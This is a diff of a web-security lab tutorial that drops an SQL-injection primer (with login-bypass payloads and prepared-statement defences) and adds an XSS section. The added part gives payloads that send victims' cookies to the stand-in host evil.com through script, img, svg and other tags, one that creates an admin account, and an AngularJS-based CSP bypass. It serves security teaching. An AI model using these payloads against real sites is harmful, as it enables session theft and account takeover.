@@ -25,91 +25,7 @@ For this section, we will explore how SQLi vulnerabilities can occur, how to exp
 
 ---
 
-### 6.1.1 How SQLi vulnerabilities occur
-
-A relational database is a collection of data that has been structured by predefined relations that are stored in tables. They are widely used for managing information for web applications and the following are the most popular relational database management systems that are currently used:
-
-- MySQL
-- SQLite
-- PostgreSQL
-- Amazon Aurora
-- MSSQL
-
-The Structured Query Language (SQL) is a programming language for querying or inserting data into a relational databases. Web applications that need to store persistent data would connect to the database and execute a set of SQL queries. However, if user inputs are insecurely inserted into the SQL query by the web application then an attacker can malform the query to perform additional opperations.
-
-To demonstrate, lets explore how a SQLi vulnerability can be exploited to bypass authentication on a website.
-
-For most websites when you login, the backend web application will query the SQL database using a query like below. In the below example, the credentials are stored in a table called `users` and `{username}` and `{password}` are replaced with the user's **username** and **password** they send respectively. If the SQL query returns a result then the backend web application would state that user has authenticated themselves.
-
-```sql
-SELECT username FROM users WHERE username = '{username}' AND password = '{password}';
-```
-
-The issue with just replacing `{username}` and `{password}` in the above query is that you can insert a `'` character that would break the query! If the attacker sends `admin'--` (`--` are comments for most DB management systems) as the username then the SQL query would only search for a username with the name `admin`! You can see how the query becomes malformed in the following SQL query and would always return a result if there is an account with the username `admin`.
-
-```sql
-SELECT username FROM users WHERE username = 'admin'--' AND password = '{password}';
-```
-
-However, if there isn't a user with the username `admin` you can still bypass the authentication by malforming the query to always return a result by inserting an `OR` conditional that will always return **true**. If the attacker changes their username payload to `admin' OR '1'='1'--` into the SQL query the DB management system would first check if the user `admin` exists **or '1'='1'** (which is always true).
-
-```sql
-SELECT username FROM users WHERE username = 'admin' OR '1'='1'--' AND password = '{password}';
-```
-
-The above query would now return all of the users stored in the `users` table and since this applications authenticates users when a result is returned from the query the attacker would be authenticated, bypassing the authentication.
-
----
-
-### 6.1.2 How to prevent SQLi vulnerabilites
-
-To prevent SQLi vulnerabilities **all user inputs need to be santised before being inserted into a SQL query** . The most effective strategy is to use **prepared statements** that decouples the SQL query from the data and **eliminates SQLi vulnerabilities**. You do this by first preparing the statement and indicating where data should be placed using the special character `?`, then you bind the actual values when the query is executed.
-
-Continuing from the previous example, the prepared statement for authentication is shown below and when it's executed the user's `username` and `password` would be binded to the query.
-
-```sql
-SELECT username FROM users WHERE username = ? AND password = ?;
-```
-
-An example is the python code below that uses prepared statements using SQLite as the DB management system.
-
-```python
-import sqlite3
-
-def login(username: str, password: str) -> bool:
-    with sqlite3.connect('/tmp/somedatabase.sqlite') as con
-        cur = con.cursor()
-        cur.execute("SELECT username FROM users WHERE username = ? AND password = ?", (username, password))
-
-        # Returns True if there is one result, False otherwise
-        return len(cur.fetchall()) == 1
-```
-
-The only issue with prepared statements is that they can only be used for parameter values (eg. in `WHERE` and `VALUES` clauses) and cannot be used to santise **table names** or the `ORDER BY` clauses. To mitigate the risk of an SQLi vulnerability, web applications should implement a Web Application Firewall (WAF) that **whitelists** what the expected input should be. For an example, if user input is being inserted after an `ORDER BY` statement and assumes the input is an integer then the WAF **should only allow integers and no other characters**.
-
-The following python code filters the user input by using prepared statement and a whitelist to make sure only integers are inserted after the `ORDER BY` statement.
-
-```python
-import sqlite3
-
-def search_memes(meme_name: str, order_by_str: str) -> list:
-    try:
-        # int() would throw an exception if any non-integer characters are in order_by_str
-        order_by = int(order_by_str)
-    except Exception as e:
-        # Return nothing since the user supplied invalid input
-        return []
-
-    with sqlite3.connect('/tmp/somedatabase.sqlite') as con
-        cur = con.cursor()
-        cur.execute("SELECT * FROM memes WHERE name ORDER BY {}".format(order_by), (meme_name,))
-
-        return cur.fetchall()
-```
-
----
-
-### 6.1.3 Union-based SQLi Attacks
+### 6.1.1 Union-based SQLi Attacks
 
 Union-based SQLi attacks exploit a SQLi vulnerability by appending the results of a malicious query after the results of the original query. This is done by injecting `UNION` statement into the SQL query then using `SELECT` to query data from other databases. It is the easiest type of SQLi vulnerability to exploit and can be used to dump all data from a SQL database quickly.
 
@@ -199,13 +115,13 @@ eg.
 
 ---
 
-### 6.1.4 Union-based SQLi Exercise
+### 6.1.2 Union-based SQLi Exercise
 
 **TODO**
 
 ---
 
-### 6.1.5 Error-based SQLi Attacks
+### 6.1.3 Error-based SQLi Attacks
 
 The only issue with Union-based SQLi is that it relies on the results of the SQL query being shown to the end user on the website to work. In a number of circumstances the results of a vulnerable SQL query are never displayed on the website and are only used by the backend web application.
 
@@ -219,13 +135,13 @@ For MySQL servers, the **`updatexml`** is a useful functioning for causing an SQ
 
 ---
 
-### 6.1.6 Error-based SQLi Exercise
+### 6.1.4 Error-based SQLi Exercise
 
 **TODO**
 
 ---
 
-### 6.1.7 Blind-based SQLi Attacks
+### 6.1.5 Blind-based SQLi Attacks
 
 There are a number of scenarios where a vulnerable SQL query is executed on the backend web application and the results/errors are never directly displayed to the end user. However, if the content on the page changes depending on the results of the vulnerable SQL query then an attacker can still exfiltrate data from the SQL server.
 
@@ -282,7 +198,7 @@ There is one issue with this approach. For MySQL string searches for nonbinary s
 
 ---
 
-### 6.1.8 Blind-based SQLi Exercise
+### 6.1.6 Blind-based SQLi Exercise
 
 **TODO**
 
@@ -290,7 +206,7 @@ There is one issue with this approach. For MySQL string searches for nonbinary s
 
 --- 
 
-### 6.1.9 Time-based SQLi Attacks
+### 6.1.7 Time-based SQLi Attacks
 
 If the vulnerable SQL query does not have show any results or alter the response, then a time-based SQLi attack is required. Time-based is similar to Blind-based SQLi, but instead of altering the response you cause the web application to **sleep** when you find the correct value and delaying the response from the website.
 
@@ -302,7 +218,7 @@ In SQL you can write an **if** statement using the MySQL function `IF`. The belo
 
 ---
 
-### 6.1.10 Time-based SQLi Exercise
+### 6.1.8 Time-based SQLi Exercise
 
 **TODO**
 
@@ -310,9 +226,9 @@ Similar to the blind-based exercise
 
 ---
 
-### 6.1.11 `sqlmap` Exercise
+### 6.1.9 `sqlmap` Exercise
 
-**DO NOT USE `sqlmap` ON ANY WEBSITES YOU DO NOT HAVE PERMISSION! IT IS A CYBER CRIME IF YOU DO!**
+**DO NOT USE `sqlmap` ON ANY WEBSITES YOU DO NOT HAVE PERMISSION! YOU WILL BE COMMITTING A CYBER CRIME!**
 
 `sqlmap` is a powerful penetration testing tool that automates detecting and exploiting SQLi vulnerabilities. It supports exploiting a large variety of relational database management systems, has built-in tamper scripts for altering payloads to bypass web applicaiton filters, and can perform all of the SQLi attacks that have been mentioned during this lab plus more.
 
@@ -328,17 +244,42 @@ For this part of the lab, we will use `sqlmap` to exploit a Time-based SQLi vuln
 
 ## 6.2.0 XSS Attacks
 
-**TODO**
+XSS attacks exploit a HTML injection vulnerability that executes malicious javascript that can access a victim's cookies, session tokens or other sensitive information from a trusted source. This lab we will explore exploiting client-side XSS vulnerabilities.
 
 ---
 
-### 6.2.1 JavaScript and the DOM for Hackers
+### 6.2.1 Exploiting a Basic XSS Vulnerability
 
-**TODO**
+The simplest attack vector for a XSS attack is to see `<script>alert(123)</script>` causes an alert to be displayed. If it does then the page is not filtering the `<` and `>` or `<script>`, enabling malicious javascript to be executed.
+
+If the session cookies have the `HttpOnly` attribute to `false`, then you can read the cookie values using `document.cookie`. Below are some example XSS payloads for exfiltrating session cookie information to a remote server at `https://evil.com`.
+
+```html
+<!-- Using the fetch API (not supported on older browsers) -->
+<script>fetch("https://evil.com/?nomnom="+document.cookie);</script>
+
+<!-- Using the XMLHttpRequest API -->
+<script>request = new XMLHttpRequest();request.open("GET", "https://evil.com/?nomnom="+document.cookie);request.send()</script>
+
+<!-- Redirecting to evil.com -->
+<script>window.location = "https://evil.com/?nomnom="+document.cookie</script>
+```
+
+However, if the session cookies have `HttpOnly` attribute set to `true` you can still perform actions as the victim on the vulnerable website. Below is an example XSS payload that adds a new admin user on the website for some vulnerable web application if the victim is an admin user.
+
+```html
+<script>
+    fetch("/api/users/add_admin",{
+        method: 'post',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({"username": "evil-user-mwahaha"}) 
+    });
+</script>
+```
 
 ---
 
-### 6.2.2 Exploiting a Basic XSS Vulnerability
+### 6.2.2 Basic XSS Attack Exercise
 
 **TODO**
 
@@ -346,11 +287,55 @@ For this part of the lab, we will use `sqlmap` to exploit a Time-based SQLi vuln
 
 ### 6.2.3 Exploiting XSS Using Other HTML Tags
 
+Sometimes a web application will have a filter implemented that removes `<script>` from the user input or the Content-Security-Policy has disabled inline execution of JavaScript code (discussed more in section 6.2.3). However, this filter is not sufficient to prevent a XSS attack since there are large number of other HTML tags that can also execute JavaScript. For an example, the `<img>` tag has an `onerror` attribute that executes JavaScript code if an error occurs trying to load the image. So you can still trigger the XSS vulnerability with the following payload.
+
+```html
+<img src=x onerror="window.location='https://evil.com/?nomnom='+document.cookie" />
+```
+
+Below are a list of other XSS payloads using other HTML tags besides `<script>` and more a listed [here](https://raw.githubusercontent.com/pgaijin66/XSS-Payloads/master/payload/payload.txt).
+
+```html
+<svg onload="window.location='https://evil.com/?nomnom='+document.cookie" />
+<div onpointerover="window.location='https://evil.com/?nomnom='+document.cookie">MOVE HERE</div>
+<body onload="window.location='https://evil.com/?nomnom='+document.cookie"></body>
+<video src=_ onloadstart="window.location='https://evil.com/?nomnom='+document.cookie" />
+```
+
+---
+
+### 6.2.4 XSS Using Other HTML Tags Exercise
+
 **TODO**
 
 ---
 
 ### 6.2.3 Bypassing Content Security Policy Protections
+
+The Content-Security-Policy (CSP) is a response header sent by web applications to browsers that define trusted sources for web content and is a recommended mitigation strategy against XSS attacks. The web browser will read the Content-Security-Policy and rejects rendering any components that do not comply with the policy. An example of a CSP configuration that will only allow rendering content hosted on the website is shown below.
+
+```
+Content-Security-Policy: default-src 'self';
+```
+
+The downside of Content-Security-Policies is that a secure configuration can significantly impact what can be rendered on the website. Therefore, most websites specify exemptions for remote resources that can be loaded. For an example the CSP below has allowed `unsafe-eval` for JavaScript code on `https://cdnjs.cloudflare.com/`.
+
+```
+Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-eval' https://cdnjs.cloudflare.com/;style-src 'self' 'unsafe-inline' https://unpkg.com/nes.css/ https://fonts.googleapis.com/;font-src 'self' https://fonts.gstatic.com/;img-src 'self' data:;child-src 'none';object-src 'none'
+```
+
+However, an attacker can bypass the above CSP since it does not specify exact JavaScript files from `https://cdnjs.cloudflare.com/` and vulnerable code to XSS that is hosted on `https://cdnjs.cloudflare.com/` can be loaded. The below payload bypasses the CSP by loading the XSS vulnerable AngularJS version 1.4.6 JavaScript file then executing the payload using a `<div>` tag.
+
+```
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
+<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };window.location = "https://evil.com/?nomnom="+document.cookie;//');}} </div>
+```
+
+[HackTricks documents a large variety of methods for bypassing Content-Security-Policy headers using third party endpoints.](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)
+
+---
+
+### 6.2.5 Bypassing CSP Exercise
 
 **TODO**
 
